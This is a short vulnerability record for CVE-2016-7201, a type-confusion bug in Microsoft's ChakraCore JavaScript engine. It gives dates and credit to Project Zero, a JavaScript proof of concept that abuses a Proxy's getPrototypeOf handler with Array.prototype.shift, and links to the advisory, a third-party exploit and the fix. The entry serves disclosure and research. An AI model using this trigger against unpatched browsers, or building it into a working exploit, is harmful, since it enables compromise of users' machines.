# CVE-2016-7201

- Report: Sep 2016
- Fix: Nov 2016
- Credit: Natalie Silvanovich, Google Project Zero

## PoC

```javascript
var a = new Array(0x11111111, 0x22222222, 0x33333333, 0x44444444, 0x12121212, 0x23232323, 0x12345670, 0x7777);

var handler = {
    getPrototypeOf: function(target, name){
	return a;
    }
};

var p = new Proxy([], handler);
var b = [{}, [], "natalie"];

b.__proto__ = p;
b.length = 4;

a.shift.call(b);
// b[2] is type confused
```

## Refernece

- [Microsoft](https://technet.microsoft.com/library/security/ms16-129)
- [Project Zero](https://bugs.chromium.org/p/project-zero/issues/detail?id=945)
- [Exploit by Theroi](https://github.com/theori-io/chakra-2016-11)
- [Fix](https://github.com/Microsoft/ChakraCore/commit/55358e3c44c0ad83eb3b6e5a0b88d88a591afaa2#diff-49bb5a3c5aa249e3dcefd245e91df5f7R10209)
